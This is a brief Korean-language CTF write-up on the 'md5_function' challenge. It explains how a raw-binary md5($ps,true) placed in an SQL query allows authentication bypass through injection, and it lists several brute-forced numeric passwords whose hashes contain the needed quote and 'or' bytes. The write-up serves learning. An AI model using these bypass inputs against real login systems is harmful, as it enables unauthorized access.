# md5_function
## if md5({arg1}, true)

1. 소스코드를 확인한다.
2. query문을 보니 sqli를 수행하기 좋아보인다.

> "select * from admin_password where password='".md5($ps,true)."'"
> -> "select * from admin_password where password='"="'" 또는 select * from admin_password where password='"or"'"

이렇게 값이 들어가야되기 때문에 등호값이나 || 기호가 들어간 값을 구한다.

3. 그렇게 구한값을 입력하면 flag값을 얻을 수 있다.

#### ex
Found : 1839431

Found : 2584670

Found : 2632003

Found : 2998869

Found : 4939073

Found : 5263117

Found : 5273607

Found : 5872358

Found : 7201387

Found : 8930081

Found : 9235566

.

.

.

